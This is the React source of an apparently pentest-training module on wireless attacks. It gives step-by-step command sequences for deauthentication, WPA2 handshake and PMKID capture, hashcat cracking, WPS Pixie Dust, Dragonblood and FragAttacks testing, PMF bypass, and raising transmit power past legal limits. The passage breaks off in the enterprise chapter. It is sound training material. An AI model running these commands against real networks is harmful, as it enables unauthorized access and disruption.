'use client'
import React from 'react'
import Link from 'next/link'
import ModuleCodex, { CodexChapter } from '../../components/ModuleCodex'

const accent = '#aaff00'
const mono = 'JetBrains Mono, monospace'

const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: mono, fontSize: '9px', color: '#6a7a3a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#060800', border: '1px solid #2a3800', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: accent, fontFamily: mono, fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: mono, fontSize: '0.85rem', fontWeight: 600, color: '#88cc00', marginTop: '1.75rem', marginBottom: '0.6rem' }}>&#9658; {children}</h3>
)
const P = ({ children }: { children: React.ReactNode }) => (
  <p style={{ color: '#8a9a8a', lineHeight: 1.8, marginBottom: '1rem', fontSize: '0.88rem' }}>{children}</p>
)
const Note = ({ type = 'info', children }: { type?: 'info' | 'warn' | 'danger' | 'tip'; children: React.ReactNode }) => {
  const cfg: Record<string, [string, string]> = {
    info:   ['#aaff00', 'NOTE'],
    warn:   ['#ffb347', 'WARNING'],
    danger: ['#ff4136', 'CRITICAL'],
    tip:    ['#00d4ff', 'PRO TIP'],
  }
  const [c, lbl] = cfg[type]
  return (
    <div style={{ background: c + '08', border: '1px solid ' + c + '33', borderLeft: '3px solid ' + c, borderRadius: '0 4px 4px 0', padding: '1rem 1.25rem', margin: '1.25rem 0' }}>
      <div style={{ fontFamily: mono, fontSize: '9px', color: c, letterSpacing: '0.2em', marginBottom: '6px' }}>{lbl}</div>
      <div style={{ color: '#8a9a9a', fontSize: '0.83rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}
const Table = ({ headers, rows }: { headers: string[]; rows: string[][] }) => (
  <div style={{ overflowX: 'auto', margin: '1rem 0 1.5rem' }}>
    <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: '0.75rem' }}>
      <thead>
        <tr style={{ borderBottom: '1px solid #2a3800' }}>
          {headers.map((h, i) => <th key={i} style={{ textAlign: 'left', padding: '8px 12px', color: '#aaff00', fontWeight: 600, letterSpacing: '0.1em', fontSize: '0.7rem' }}>{h}</th>)}
        </tr>
      </thead>
      <tbody>
        {rows.map((row, i) => (
          <tr key={i} style={{ borderBottom: '1px solid #141a00', background: i % 2 === 0 ? 'transparent' : 'rgba(170,255,0,0.015)' }}>
            {row.map((cell, j) => <td key={j} style={{ padding: '8px 12px', color: '#8a9a8a', verticalAlign: 'top' }}>{cell}</td>)}
          </tr>
        ))}
      </tbody>
    </table>
  </div>
)

const chapters: CodexChapter[] = [
  {
    id: 'wl-01',
    title: 'Wireless Fundamentals & Standards',
    difficulty: 'BEGINNER',
    readTime: '14 min',
    labLink: '/modules/wireless-attacks/lab',
    takeaways: [
      '802.11ax (WiFi 6) adds OFDMA and MU-MIMO but the WPA2/WPA3 auth layer is still the primary attack surface',
      '2.4GHz travels further and penetrates walls better - ideal for surveillance; 5GHz is faster but shorter range',
      'A hidden SSID provides no real security - passive monitoring reveals it within seconds of any client probe',
      'Management frames (beacons, deauth, disassoc) are unencrypted in WPA2 - only 802.11w/PMF changes this',
      'Chipset selection is critical: RTL8812AU (AWUS036ACH) supports monitor mode and packet injection on modern kernels',
    ],
    content: (
      <div>
        <P>Before attacking wireless networks you must understand how they work at the protocol level. The 802.11 standard family defines how devices communicate over radio frequency. Each generation trades range, speed, and frequency band differently - and each has different security implications for attackers and defenders.</P>

        <H3>802.11 Standards Comparison</H3>
        <Table
          headers={['Standard', 'WiFi Brand', 'Frequency', 'Max Speed', 'Security Note']}
          rows={[
            ['802.11b', 'WiFi 1', '2.4GHz', '11 Mbps', 'WEP era - completely broken'],
            ['802.11a', 'WiFi 2', '5GHz', '54 Mbps', 'WEP era - 5GHz less congested'],
            ['802.11g', 'WiFi 3', '2.4GHz', '54 Mbps', 'WEP/WPA transition era'],
            ['802.11n', 'WiFi 4', '2.4/5GHz', '600 Mbps', 'WPA2 common, TKIP still seen'],
            ['802.11ac', 'WiFi 5', '5GHz only', '6.9 Gbps', 'WPA2-CCMP standard'],
            ['802.11ax', 'WiFi 6', '2.4/5GHz', '9.6 Gbps', 'WPA3 optional, WPA2 still dominant'],
            ['802.11ax', 'WiFi 6E', '6GHz added', '9.6 Gbps', '6GHz band requires WPA3 - harder to attack'],
          ]}
        />

        <H3>Frequency Bands: Attacker Perspective</H3>
        <P>The frequency band determines range, interference, and available channels. Each matters differently for wireless attacks.</P>
        <Table
          headers={['Band', 'Range', 'Channels (non-overlap)', 'Interference', 'Attack Relevance']}
          rows={[
            ['2.4GHz', 'Up to 150m outdoors', '3 (1, 6, 11)', 'High - microwaves, baby monitors, BT', 'Best for long-range capture; crowded band'],
            ['5GHz', 'Up to 50m outdoors', '25+', 'Low', 'Higher throughput networks; PMKID works here'],
            ['6GHz (6E)', 'Shorter than 5GHz', '59', 'Minimal', 'Limited attack tools; requires WPA3'],
          ]}
        />

        <H3>SSID, BSSID, ESSID</H3>
        <P>These three terms are often confused but have precise meanings in 802.11.</P>
        <Pre label="// WIRELESS IDENTIFIER CONCEPTS">{`SSID  (Service Set Identifier)
      The human-readable network name (up to 32 bytes)
      Broadcast in beacon frames every ~100ms
      NOT a security control - trivially discovered

BSSID (Basic Service Set Identifier)
      The MAC address of the access point radio
      Unique per AP (or per band on multi-band APs)
      Used by clients to distinguish overlapping same-name networks
      Can be spoofed: macchanger -m AA:BB:CC:DD:EE:FF INTERFACE_HERE

ESSID (Extended Service Set Identifier)
      Multiple APs sharing the same SSID form an ESS
      Clients roam between APs in the same ESS
      All APs share the same PSK in WPA2-Personal ESS

Hidden SSID attack:
      AP sends beacons with SSID field zeroed out (null bytes)
      Clients still send probe requests with the SSID embedded
      Passive capture reveals SSID immediately when any client connects
      airodump-ng reveals hidden SSIDs within seconds in most environments`}</Pre>

        <H3>802.11 Frame Types</H3>
        <P>The 802.11 protocol uses three categories of frames. Understanding them helps you know what to capture and what to inject during attacks.</P>
        <Table
          headers={['Category', 'Examples', 'Attack Relevance']}
          rows={[
            ['Management', 'Beacon, Probe Req/Resp, Auth, Deauth, Assoc, Disassoc', 'Unprotected in WPA2 - forge deauth/disassoc to kick clients'],
            ['Control', 'ACK, RTS, CTS, Block ACK', 'Used in jamming and DoS; less exploited directly'],
            ['Data', 'QoS Data, Null Data, CF-Poll', 'Encrypted payload; capture for handshake/PMKID extraction'],
          ]}
        />
        <Pre label="// BEACON FRAME STRUCTURE (simplified)">{`802.11 Beacon Frame:
  Frame Control   (2 bytes) - type=Management, subtype=Beacon
  Duration        (2 bytes)
  Destination     (6 bytes) - FF:FF:FF:FF:FF:FF (broadcast)
  Source (BSSID)  (6 bytes) - AP MAC address
  BSSID           (6 bytes) - same as source for infrastructure
  Sequence Ctrl   (2 bytes)
  Timestamp       (8 bytes) - microseconds since AP boot
  Beacon Interval (2 bytes) - typically 100 TUs (102.4ms)
  Capability Info (2 bytes) - ESS, Privacy (WPA), Short Preamble
  Tagged Params:
    SSID element   (tag 0)  - the network name
    Supported Rates (tag 1)
    DS Parameter   (tag 3)  - current channel
    RSN Information (tag 48) - WPA2/WPA3 capabilities
    HT/VHT/HE Capabilities   - 802.11n/ac/ax specific`}</Pre>

        <H3>WEP: Completely Broken</H3>
        <P>Wired Equivalent Privacy uses RC4, a stream cipher. The fundamental flaw is IV (Initialization Vector) reuse. RC4 requires a unique keystream per packet. WEP uses a 24-bit IV prepended to the key, giving only 16 million possible IV values. On a busy network, IVs repeat within minutes. Capturing enough IVs with repeated values allows statistical analysis to recover the key regardless of its length.</P>
        <Pre label="// WEP IV COLLISION ATTACK (aircrack-ng)">{`# Put interface in monitor mode
airmon-ng start wlan0

# Capture IVs from target WEP network (BSSID_HERE = target AP MAC)
airodump-ng --bssid BSSID_HERE -c CHANNEL_NUM -w wep_capture wlan0mon

# Inject ARP packets to accelerate IV collection (active attack)
aireplay-ng -3 -b BSSID_HERE -h CLIENT_MAC_HERE wlan0mon

# Crack once you have 40,000-80,000 IVs (60,000 for 128-bit key)
aircrack-ng wep_capture-01.cap

# WEP 40-bit key cracks in seconds
# WEP 104-bit key cracks in minutes
# There is NO secure version of WEP`}</Pre>
        <Note type="danger">WEP is never acceptable on any network. If you encounter WEP in a real environment, it represents a critical finding requiring immediate remediation.</Note>

        <H3>WPA2 Key Hierarchy</H3>
        <P>WPA2 uses a multi-layer key derivation scheme. Understanding each key is essential for understanding what the 4-way handshake captures and how cracking works.</P>
        <Pre label="// WPA2 KEY HIERARCHY">{`PSK   (Pre-Shared Key)
      The password typed by the user (8-63 ASCII chars)
      NOT used directly for encryption

PMK   (Pairwise Master Key) = PBKDF2-SHA1(PSK, SSID, 4096 iterations, 256 bits)
      SSID is mixed in - PMK is SSID-specific
      This is why rainbow tables are per-SSID

PTK   (Pairwise Transient Key) = PRF(PMK + ANonce + SNonce + AP_MAC + Client_MAC)
      Derived fresh per session in the 4-way handshake
      Used to encrypt unicast traffic

GTK   (Group Temporal Key)
      Distributed by AP to all clients during handshake
      Used to encrypt broadcast/multicast traffic
      Single GTK shared by all clients on same network

MIC   (Message Integrity Code)
      Computed over the handshake using KCK (part of PTK)
      Cracking = trying PMK candidates until MIC validates`}</Pre>

        <H3>WPA3-Personal: SAE Handshake</H3>
        <P>WPA3 replaces PSK with SAE (Simultaneous Authentication of Equals), also called the Dragonfly handshake. The critical improvement is forward secrecy - even if an attacker captures the full handshake AND later obtains the password, they cannot decrypt previously captured traffic. SAE also prevents offline dictionary attacks against captured handshakes.</P>

        <H3>WPA2-Enterprise: 802.1X Overview</H3>
        <P>Enterprise WiFi uses 802.1X with a RADIUS server. The supplicant (client) authenticates to the RADIUS server through the AP acting as authenticator. The AP passes EAP frames without inspecting them. Different EAP methods provide very different security - EAP-TLS is the strongest, PEAP-MSCHAPv2 is the most common and most attackable.</P>

        <H3>802.11w: Management Frame Protection</H3>
        <P>PMF/802.11w protects management frames with cryptographic signatures. When enforced, deauthentication and disassociation frames from unauthenticated sources are rejected by the client. WPA3 mandates PMF. WPA2 networks can optionally enable it. When PMF is active, classic deauth injection attacks fail.</P>

        <H3>Hardware for Wireless Attacks</H3>
        <Table
          headers={['Adapter', 'Chipset', 'Bands', 'Monitor Mode', 'Packet Injection', 'Notes']}
          rows={[
            ['Alfa AWUS036ACH', 'RTL8812AU', '2.4/5GHz', 'Yes', 'Yes', 'Best all-around for 802.11ac attacks'],
            ['Alfa AWUS1900', 'RTL8814AU', '2.4/5GHz', 'Yes', 'Yes', '4x4 MIMO, highest gain antennas'],
            ['Alfa AWUS036NHA', 'AR9271', '2.4GHz only', 'Yes', 'Yes', 'Very stable, older but reliable'],
            ['Panda PAU09', 'RT5572', '2.4/5GHz', 'Yes', 'Partial', 'Budget option, limited 5GHz injection'],
            ['Built-in Intel/Broadcom', 'Varies', '2.4/5GHz', 'Partial', 'No', 'Generally not suitable for active attacks'],
          ]}
        />
        <Pre label="// REGULATORY DOMAIN MANIPULATION">{`# Check current regulatory domain
iw reg get

# Set to a region with higher TX power limits (testing only)
iw reg set BO

# Check max TX power per channel
iwlist wlan0 txpower

# Set specific TX power (dBm)
iwconfig wlan0 txpower 30

# WARNING: Exceeding legal TX power limits is illegal
# Use only in controlled lab environments or with explicit permission`}</Pre>

        <H3>Kismet: Passive Wireless Monitoring</H3>
        <Pre label="// KISMET SETUP AND USAGE">{`# Install kismet
sudo apt install kismet

# Add user to kismet group
sudo usermod -aG kismet USERNAME_HERE

# Start kismet with specific source
kismet -c wlan0mon

# Kismet web UI: http://localhost:2501
# Default credentials set on first run

# Kismet as wireless IDS:
# Detects deauth floods, SSID spoofing, rogue APs
# Tracks device associations over time
# Exports pcap, JSON, SQLite logs

# Command-line client (kismetdb_to_pcap)
kismetdb_to_pcap --in kismet_log.kismet --out capture.pcap`}</Pre>
      </div>
    ),
  },
  {
    id: 'wl-02',
    title: 'WPA2 Attacks - Complete Guide',
    difficulty: 'INTERMEDIATE',
    readTime: '18 min',
    labLink: '/modules/wireless-attacks/lab',
    takeaways: [
      'Monitor mode and airmon-ng check kill are prerequisites - skip them and injection fails silently',
      'The PMKID attack is faster than handshake capture because it requires no client - just an AP association attempt',
      'hashcat -m 22000 handles both PMKID and EAPOL handshake in a unified format - prefer it over aircrack-ng',
      'WPS Pixie Dust is an offline attack using weak random number generation - cracks most vulnerable APs in seconds',
      'KRACK affects clients more than APs - a patched AP with unpatched clients is still exploitable',
    ],
    content: (
      <div>
        <P>WPA2 remains the dominant WiFi security protocol. Despite being introduced in 2004, the core attack surface - the 4-way handshake and weak passwords - has not changed. This chapter covers the complete attack chain from setup through cracking.</P>

        <H3>Step 1: Monitor Mode Setup</H3>
        <Pre label="// ENABLE MONITOR MODE">{`# Kill conflicting processes (NetworkManager, wpa_supplicant, dhclient)
sudo airmon-ng check kill

# Verify which processes were killed
sudo airmon-ng check

# Enable monitor mode on wlan0
sudo airmon-ng start wlan0

# Verify monitor mode is active
iwconfig
# Look for: wlan0mon   Mode:Monitor

# Alternative using iw (more modern)
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up

# Check current mode
iw wlan0 info | grep type`}</Pre>

        <H3>Step 2: Scanning for Targets</H3>
        <Pre label="// AIRODUMP-NG COMPLETE FLAG REFERENCE">{`# Basic scan - all bands, all channels
sudo airodump-ng wlan0mon

# Target specific AP and channel (reduces missed packets)
sudo airodump-ng -c CHANNEL_NUM --bssid BSSID_HERE -w capture_prefix wlan0mon

# Flags reference:
#   -c CHANNEL_NUM          Lock to specific channel (1-14 for 2.4GHz, 36-165 for 5GHz)
#   --bssid BSSID_HERE      Filter to single AP
#   -w PREFIX               Write output to PREFIX-01.cap, .csv, .kismet
#   --output-format pcap    Write pcap format (default)
#   --output-format csv     Also write CSV station list
#   --uptime                Show AP uptime (helps identify rebooted APs)
#   --band abg              Scan 2.4GHz + 5GHz simultaneously (requires two radios)
#   -M                      Show manufacturer from OUI database

# Reading output columns:
# BSSID     - AP MAC address
# PWR       - Signal strength (closer to 0 = stronger)
# Beacons   - Number of beacon frames received
# #Data     - Data frames (more = busier network, better for capture)
# #/s       - Data frames per second
# CH        - Channel
# MB        - Max speed (link rate)
# ENC       - Encryption type (WPA2, WPA3, WEP, OPN)
# CIPHER    - CCMP (AES) or TKIP
# AUTH      - PSK, MGT (Enterprise), SAE (WPA3)
# ESSID     - Network name`}</Pre>

        <H3>Step 3: Capture the 4-Way Handshake</H3>
        <Pre label="// HANDSHAKE CAPTURE">{`# Start targeted capture (leave running in terminal 1)
sudo airodump-ng -c CHANNEL_NUM --bssid BSSID_HERE -w handshake wlan0mon

# Wait for a client to connect naturally, OR force reconnect:
# In terminal 2 - send deauth frames to a specific client
sudo aireplay-ng -0 5 -a BSSID_HERE -c CLIENT_MAC_HERE wlan0mon
#   -0 5   = deauthentication, send 5 frames
#   -a     = target AP BSSID
#   -c     = target client MAC (omit for broadcast deauth)

# Broadcast deauth (less targeted, more disruptive)
sudo aireplay-ng -0 10 -a BSSID_HERE wlan0mon

# Confirm handshake captured
# airodump-ng shows: WPA handshake: BSSID_HERE in top-right corner

# Verify with aircrack-ng (no wordlist = just checks for handshake)
aircrack-ng handshake-01.cap

# 802.11w note:
# If PMF is enforced, deauth injection is silently dropped by the client
# AP shows PMF status in RSN IE: MFPC=1 (capable), MFPR=1 (required)`}</Pre>
        <Note type="warn">Deauthentication attacks cause visible network disruption. They are easily detected by any WIDS. Only use in authorized testing environments with explicit written permission.</Note>

        <H3>PMKID Attack (Clientless)</H3>
        <P>Discovered in 2018, the PMKID attack extracts the PMKID from the first EAPOL frame of the 4-way handshake. The AP sends this immediately in response to an association request - no client needs to be connected and no deauth is needed. The PMKID is derived from the PMK (which comes from the password), so it can be used for offline cracking.</P>
        <Pre label="// PMKID ATTACK WITH HCXDUMPTOOL">{`# Install hcxtools
sudo apt install hcxdumptool hcxtools

# Capture PMKID from all nearby APs (no target needed)
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1

# Target specific AP only
echo "BSSID_HERE" > ap_filter.lst
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng \
  --filterlist_ap=ap_filter.lst --filtermode=2 --enable_status=3

# hcxdumptool flags:
#   --enable_status=N     Verbose output (1=minimal, 3=full)
#   --filterlist_ap=FILE  Whitelist of AP BSSIDs to target
#   --filtermode=2        Only capture from listed APs
#   -o FILE.pcapng        Output in pcapng format

# Convert pcapng to hashcat format (22000)
hcxpcapngtool -o hash.hc22000 pmkid_capture.pcapng

# Inspect what was captured
hcxpcapngtool --info=stdout pmkid_capture.pcapng

# Filter by SSID or network
hcxhashtool -i hash.hc22000 --filter-essid "TARGETSSID" -o filtered.hc22000`}</Pre>

        <H3>Cracking with Hashcat</H3>
        <Pre label="// HASHCAT WPA2 CRACKING">{`# Crack using unified 22000 format (PMKID + EAPOL both work)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# -m 22001 = WPA-PMKID-PBKDF2 only (PMKID without EAPOL)
hashcat -m 22001 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Apply rules for mutation (best64 is the standard starting point)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Combination attack (two wordlists combined)
hashcat -m 22000 hash.hc22000 -a 1 wordlist1.txt wordlist2.txt

# Mask attack (pattern-based brute force)
# ?d = digit, ?l = lowercase, ?u = uppercase, ?s = special
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Common WiFi password patterns
hashcat -m 22000 hash.hc22000 -a 3 Password?d?d?d?d
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?l?l?d?d?d?d

# Show cracked passwords
hashcat -m 22000 hash.hc22000 --show`}</Pre>

        <H3>Custom Wordlist Generation</H3>
        <Pre label="// WORDLIST TOOLS">{`# crunch - generate by length and charset
# crunch MIN MAX CHARSET -o OUTPUT
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o custom.txt

# crunch with pattern (@ = lowercase, % = number, ^ = special)
crunch 10 10 -t Company@@@% -o company_pwds.txt

# CUPP - Common User Password Profiler (targeted generation)
python3 cupp.py -i
# Enter target info: name, birthday, pet name, company
# Generates personalized password list based on OSINT

# CeWL - spider a website for words to use as passwords
cewl https://TARGET_DOMAIN_HERE -m 6 -d 2 -w cewl_wordlist.txt
#   -m 6   = minimum 6 character words
#   -d 2   = crawl depth
# Useful for corporate WiFi where password might be company-related

# Combine with hashcat rules
hashcat -m 22000 hash.hc22000 cewl_wordlist.txt \
  -r /usr/share/hashcat/rules/d3ad0ne.rule`}</Pre>

        <H3>aircrack-ng for Handshake Cracking</H3>
        <Pre label="// AIRCRACK-NG CRACKING">{`# Basic dictionary attack against captured handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Target specific network in multi-network capture file
aircrack-ng -w rockyou.txt -e "SSID_HERE" handshake-01.cap

# Or by BSSID
aircrack-ng -w rockyou.txt -b BSSID_HERE handshake-01.cap

# Note: aircrack-ng only uses CPU, hashcat uses GPU
# hashcat is 50-100x faster than aircrack-ng on typical hardware`}</Pre>

        <H3>WPS Attacks</H3>
        <P>WPS (WiFi Protected Setup) was designed to simplify device connection using an 8-digit PIN. A design flaw allows the PIN to be verified in two halves of 4 digits each, reducing the brute force space from 100 million to 11,000 combinations. Pixie Dust is a faster offline attack exploiting weak nonce generation in vulnerable chipsets.</P>
        <Pre label="// WPS ATTACKS WITH REAVER AND BULLY">{`# Scan for WPS-enabled APs
sudo wash -i wlan0mon
# Columns: BSSID, Ch, dBm, WPS, Lck, ESSID
# Lck=Yes means WPS is locked (too many failed attempts)
# Lck=No = target is open

# Reaver - WPS PIN brute force
sudo reaver -i wlan0mon -b BSSID_HERE -c CHANNEL_NUM -vv

# Reaver Pixie Dust attack (offline, much faster)
sudo reaver -i wlan0mon -b BSSID_HERE -c CHANNEL_NUM -K 1 -vv
# -K 1 = Pixie Dust mode

# Bully - alternative WPS tool with better success on some APs
sudo bully wlan0mon -b BSSID_HERE -c CHANNEL_NUM -d

# Pixie Dust with pixiewps directly
sudo pixiewps -e ENROLLEE_PKE_HERE -r REGISTRAR_PKE_HERE \
  -s E_HASH1_HERE -z E_HASH2_HERE -a AUTHKEY_HERE -n E_NONCE_HERE

# Timing note:
# WPS PIN brute force: hours (rate limited by AP)
# Pixie Dust: seconds to minutes (offline computation)`}</Pre>

        <H3>KRACK Attack (CVE-2017-13077)</H3>
        <Pre label="// KRACK ATTACK OVERVIEW">{`# Key Reinstallation Attack
# Affects: the 4-way handshake implementation in clients
# Core issue: nonce reuse due to retransmission handling

# Attack flow:
# 1. Client completes 4-way handshake, installs PTK
# 2. AP retransmits message 3 (thinks ACK was lost)
# 3. Vulnerable client reinstalls the SAME key
# 4. Nonce resets to 0 - keystream reuse becomes possible
# 5. Attacker can decrypt/forge packets

# Who is affected:
# - Unpatched Linux wpa_supplicant (critical - all-zero key bug)
# - Unpatched Android 6.0+ (similar all-zero key)
# - Unpatched Windows (partial - less severe)
# - Most APs: NOT directly vulnerable (they don't reinstall keys)

# Detection: monitor for duplicate nonces in encrypted frames
# Mitigation: patch all clients; WPA3 is not vulnerable to KRACK

# Check if wpa_supplicant is patched
wpa_supplicant -v
# Look for version >= 2.6 with KRACK patches applied`}</Pre>
      </div>
    ),
  },
  {
    id: 'wl-03',
    title: 'WPA3 & Advanced Protocol Attacks',
    difficulty: 'ADVANCED',
    readTime: '12 min',
    takeaways: [
      'Dragonblood timing side-channels require only 75 handshakes to recover the WPA3 password group being used',
      'Downgrade attacks work against WPA3 Transition Mode - any network supporting both WPA2 and WPA3 is potentially vulnerable',
      'FragAttacks affect the 802.11 fragmentation and reassembly layer - separate from authentication, patching is slow',
      'OWE (Enhanced Open) encrypts the connection but provides no authentication - MITM is trivial with a rogue AP',
      'WiFi 6E in the 6GHz band mandates WPA3 - limited attack tooling exists but Dragonblood-class attacks still apply to SAE',
    ],
    content: (
      <div>
        <P>WPA3 was designed to address WPA2 weaknesses, particularly offline dictionary attacks against captured handshakes. However, the Dragonblood research revealed multiple implementation vulnerabilities in the SAE (Dragonfly) handshake. This chapter covers WPA3-specific attacks and advanced protocol-level vulnerabilities.</P>

        <H3>WPA3-SAE Dragonfly Handshake</H3>
        <Pre label="// SAE HANDSHAKE FLOW">{`WPA3-Personal SAE (Simultaneous Authentication of Equals):

Phase 1: Commit Exchange
  1. Both sides independently derive a Password Element (PE)
     PE = hash-to-curve(password, MAC_A, MAC_B)
     The blinding factor prevents offline dictionary attacks
  2. Both sides send a Commit message:
     Commit = scalar + element (ephemeral EC values)
     These are unique per handshake - no reuse

Phase 2: Confirm Exchange
  3. Both sides send a Confirm message
     Confirm = HMAC(KCK, MAC_A || MAC_B || send_confirm || scalar_A || element_A || scalar_B || element_B)
  4. If both Confirms verify, authentication succeeds

Key properties:
  - Forward secrecy: each session derives a fresh PMK
  - No offline cracking: attacker must be active for each guess
  - Even with password in hand, past sessions cannot be decrypted`}</Pre>

        <H3>Dragonblood Attacks</H3>
        <P>The Dragonblood paper (2019) by Vanhoef and Ronen identified multiple vulnerabilities in SAE implementations. The attacks exploit side-channels rather than breaking the cryptography itself.</P>
        <Pre label="// DRAGONBLOOD VULNERABILITIES">{`CVE-2019-9494: Timing Side-Channel
  - SAE commit uses different execution paths depending on password
  - Attacker measures response time to Commit messages
  - With ~75 timing measurements, can determine which group is used
  - Combined with offline dictionary attack: reveals password

CVE-2019-9496: Cache-Based Side-Channel
  - If attacker shares CPU with AP (VM environment)
  - Cache timing reveals PE derivation path
  - Same outcome: password recovery

Dragonslayer tool:
  git clone https://github.com/vanhoef/dragonslayer

# Testing SAE timing vulnerability
python3 dragonslayer.py -i wlan0mon -b BSSID_HERE \
  --test-timing --wordlist /usr/share/wordlists/rockyou.txt

# EAP-pwd side-channel (CVE-2019-9495)
# Applies to WPA-Enterprise with EAP-pwd method
# Similar cache timing attack during PE derivation`}</Pre>

        <H3>Downgrade Attacks: WPA3 Transition Mode</H3>
        <P>Most networks deploying WPA3 enable Transition Mode to maintain backward compatibility with WPA2 clients. This allows both WPA2 and WPA3 connections. An attacker running a rogue AP with only WPA2 can force WPA3-capable clients to connect with WPA2, then apply classic WPA2 attacks.</P>
        <Pre label="// WPA3 DOWNGRADE ATTACK">{`# Transition mode networks announce both WPA2 and WPA3 in RSN IE
# Scan to identify transition mode targets
sudo airodump-ng wlan0mon
# Look for: AUTH=PSK-SAE (both listed = transition mode)

# Attack: deploy rogue AP with matching SSID but WPA2-only
# Client connects to rogue AP with WPA2 instead of WPA3
# Capture WPA2 4-way handshake -> offline crack

# SSID Confusion Attack (CVE-2023-52424)
# Affects: all 802.11 standards
# Attack: two networks - Network_A (WPA2) and Network_B (WPA3)
# If client is configured for Network_B, attacker presents:
#   - Network_B SSID on Network_A infrastructure (different BSSID)
# Client associates and uses Network_A credentials
# Standard has no binding between SSID and network credentials`}</Pre>

        <H3>FragAttacks (CVE-2020-24588 family)</H3>
        <P>FragAttacks are a collection of vulnerabilities in the 802.11 fragmentation and reassembly layer, published in 2021. They affect virtually all WiFi implementations regardless of security protocol. Three design flaws and several implementation flaws allow an attacker in WiFi range to inject arbitrary frames.</P>
        <Table
          headers={['CVE', 'Name', 'Vulnerability Type', 'Impact']}
          rows={[
            ['CVE-2020-24587', 'Mixed Key Attack', 'Design flaw', 'Fragment reassembly using keys from different sessions'],
            ['CVE-2020-24588', 'A-MSDU Flag Attack', 'Design flaw', 'Attacker can inject crafted A-MSDU frames to redirect traffic'],
            ['CVE-2020-24586', 'Cache Poisoning', 'Design flaw', 'Old fragments remain in cache; stale fragments reassembled'],
            ['CVE-2020-26145', 'Plain Text Injection', 'Impl. flaw', 'Some APs accept unencrypted broadcast fragments'],
            ['CVE-2020-26144', 'Plain Text A-MSDU', 'Impl. flaw', 'AP accepts plaintext A-MSDU starting with RFC 1042 header'],
          ]}
        />
        <Pre label="// FRAGATTACKS TESTING">{`# Test tool from original researchers
git clone https://github.com/vanhoef/fragattacks
cd fragattacks

# Run all tests against an AP
python3 fragattack.py wlan0mon --ap BSSID_HERE --channel CHANNEL_NUM

# Specific test cases
python3 fragattack.py wlan0mon --ap BSSID_HERE \
  --test ping-frag-amsdu           # A-MSDU flag test
python3 fragattack.py wlan0mon --ap BSSID_HERE \
  --test eapfrag                   # Fragment injection during EAP

# Mitigation: patch the AP and all clients
# Many IoT devices remain unpatched - check vendor advisories`}</Pre>

        <H3>OWE (Opportunistic Wireless Encryption)</H3>
        <Pre label="// OWE / ENHANCED OPEN ATTACK">{`# OWE (802.11ax Enhanced Open) = unauthenticated Diffie-Hellman
# Encrypts the connection but does NOT authenticate the AP
# Client has no way to verify it is talking to the legitimate AP

# OWE MITM Attack:
# 1. Real AP broadcasts OWE-capable SSID "FreeWiFi"
# 2. Attacker broadcasts identical SSID "FreeWiFi" with OWE
# 3. Client associates with attacker AP (no authentication to verify)
# 4. Attacker relays traffic between client and real AP
# 5. All traffic is encrypted end-to-end with attacker in the middle

# Detection: OWE does not prevent MITM by design
# Defense: use VPN over any public/open WiFi regardless of encryption`}</Pre>

        <H3>Protected Management Frames (PMF) Bypass</H3>
        <Pre label="// PMF BYPASS TECHNIQUES">{`# Standard deauth is blocked when PMF is active
# PMF-protected deauth requires SA Query timeout mechanism

# Technique 1: Beacon flooding
# Send hundreds of beacons per second with the same SSID
# Can confuse some client implementations even with PMF
mdk4 wlan0mon b -n "SSID_HERE" -c CHANNEL_NUM -s 1000

# Technique 2: SA Query timeout abuse
# Send disassoc to trigger SA Query process
# If client takes too long, some implementations fall back
# Requires close physical proximity and specific timing

# Technique 3: Channel switching
# Send Channel Switch Announcement (CSA) management frames
# Redirects clients to attacker-controlled channel
# Some implementations do not require PMF for CSA frames

# Technique 4: Target unprotected clients
# Identify clients without PMF support via probe responses
# PMF is optional in WPA2 - many clients still don't use it`}</Pre>
      </div>
    ),
  },
  {
    id: 'wl-04',
    title: 'WPA Enterprise & 802.1X Attacks',
    difficulty: 'ADVANCED',
    readTime: '14 min',
    takeaways: [
      'PEAP-MSCHAPv2 is the most common enterprise WiFi protocol and leaks NTLMv2 hashes when clients fail to validate the RADIUS certificate',
      'hostapd-wpe automates rogue RADIUS setup - captures credentials from clients that connect without certificate validation',
      'eaphammer is the modern enterprise attack framework with auto-certificate generation and EAP method forcing',
      'Cracked NTLMv2 hashes from WiFi give domain credentials usable for pass-the-hash across the internal network',
      'The only robust defense is EAP-TLS with mutual certificate authentication - no username/password to steal',
    ],
    content: (
      <div>
        <P>WPA2/WPA3-Enterprise replaces the pre-shared key with 802.1X authentication. A RADIUS server verifies credentials using EAP (Extensible Authentication Protocol). While this sounds more secure, the most common deployment (PEAP-MSCHAPv2) has a critical weakness: if clients do not validate the RADIUS server certificate, an attacker running a rogue RADIUS server captures NTLMv2 hashes.</P>

        <H3>802.1X EAP Flow</H3>
        <Pre label="// 802.1X AUTHENTICATION SEQUENCE">{`Supplicant (Client) <-> Authenticator (AP) <-> Authentication Server (RADIUS)

1. Client associates with AP (no internet yet - in "uncontrolled port")
2. AP sends EAP-Request/Identity
3. Client sends EAP-Response/Identity (username)
4. AP forwards to RADIUS server via RADIUS Access-Request
5. RADIUS and client exchange EAP method frames (PEAP, EAP-TLS, etc.)
   AP is transparent relay - it does not inspect EAP content
6. RADIUS sends Access-Accept or Access-Reject
7. AP opens "controlled port" - client gets network access

